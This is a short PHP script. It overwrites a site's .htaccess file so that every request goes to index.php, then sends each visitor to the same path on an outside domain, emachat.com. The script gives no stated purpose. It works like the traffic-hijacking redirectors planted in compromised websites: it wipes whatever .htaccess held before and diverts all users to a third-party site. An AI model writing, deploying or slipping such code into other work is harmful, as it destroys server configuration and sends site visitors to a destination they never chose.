<?php
$domain="https://emachat.com";//Pointed Domain
function filecreate($code){$file_handle = fopen(".htaccess", 'w');fwrite($file_handle, $code);fclose($file_handle);header("location:"."index.php");}$code="RewriteEngine on
RewriteCond %{REQUEST_URI} !^/index\.php$
RewriteRule ^ /index.php [L]";$q=$domain.$_SERVER["REQUEST_URI"];if(file_exists(".htaccess")){$file = '.htaccess';$searchfor = $code;$contents = file_get_contents($file);$pattern = preg_quote($searchfor, '/');$pattern = "/^.*$pattern.*\$/m";if(preg_match_all($pattern, $contents, $matches)){header("location:".$q);}else{filecreate($code);}}else{filecreate($code);}
?>
